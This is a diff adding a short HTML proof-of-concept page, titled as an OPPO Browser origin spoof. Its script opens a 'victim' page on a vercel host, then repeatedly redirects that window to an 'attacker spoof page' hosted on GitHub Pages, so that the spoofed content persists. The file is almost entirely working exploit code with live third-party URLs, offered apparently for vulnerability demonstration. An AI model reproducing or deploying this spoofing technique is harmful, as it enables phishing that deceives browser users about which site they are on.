@@ -1,0 +1,27 @@
+<!doctype html>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>atu – OPPO Browser Origin Spoof PoC</title>
+<style>
+  body { display:flex; align-items:center; justify-content:center; min-height:100vh; font-family:sans-serif; }
+  button { padding:16px 24px; font-size:18px; border-radius:10px; border:0; background:#4285f4; color:white; }
+</style>
+<button id="launch">Click to open spoofed tab</button>
+
+<script>
+document.getElementById('launch').onclick = () => {
+  // victim page hosted on vercel
+  const victimUrl = "https://max-pay-nine.vercel.app/victu.html";
+  const win = window.open(victimUrl, "_blank");
+
+  // attacker spoof page hosted on GitHub Pages
+  const spoofUrl = "https://mrnoob790.github.io/ats.html";
+
+  // small delay so victim triggers intent:x; first
+  setTimeout(() => { try { win.location.href = spoofUrl; } catch(e){} }, 150);
+
+  // keep UI persistent (no flicker) forever
+  setInterval(() => {
+    try { if (win && !win.closed) win.location.href = spoofUrl; } catch(e){}
+  }, 1800);
+};
+</script>
